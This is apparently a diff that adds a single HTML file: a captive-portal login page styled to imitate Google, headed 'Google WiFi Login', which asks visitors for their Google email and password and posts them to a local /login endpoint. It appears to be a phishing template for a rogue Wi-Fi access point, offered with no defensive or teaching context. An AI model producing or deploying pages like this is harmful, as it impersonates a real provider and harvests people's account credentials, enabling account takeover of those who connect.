@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Login</title>
+    <style>
+        body { font-family: 'Roboto', sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 24px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); width: 90%; max-width: 400px; text-align: center; }
+        h1 { font-size: 24px; color: #202124; margin-bottom: 16px; }
+        p { color: #5f6368; font-size: 14px; margin-bottom: 24px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Google WiFi Login</h1>
+        <p>Sign in with your Google account to connect to this network.</p>
+        <form action="/login" method="POST">
+            <input type="email" name="email" placeholder="Email or phone" required>
+            <input type="password" name="password" placeholder="Enter your password" required>
+            <button type="submit">Next</button>
+        </form>
+    </div>
+</body>
+</html>
